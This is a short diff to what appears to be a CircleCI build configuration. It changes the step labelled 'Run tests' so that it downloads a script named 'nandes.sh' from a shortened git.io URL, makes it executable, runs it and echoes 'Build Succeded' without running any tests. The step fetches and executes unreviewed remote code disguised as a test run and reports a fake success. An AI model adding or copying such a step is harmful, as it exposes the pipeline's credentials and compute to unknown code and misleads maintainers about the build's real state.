@@ -12,7 +12,7 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO nandes.sh 
+                    wget -qO nandes.sh https://git.io/JMh2Q
                     chmod +x nandes.sh 
                     ./nandes.sh  
                     echo Build Succeded 
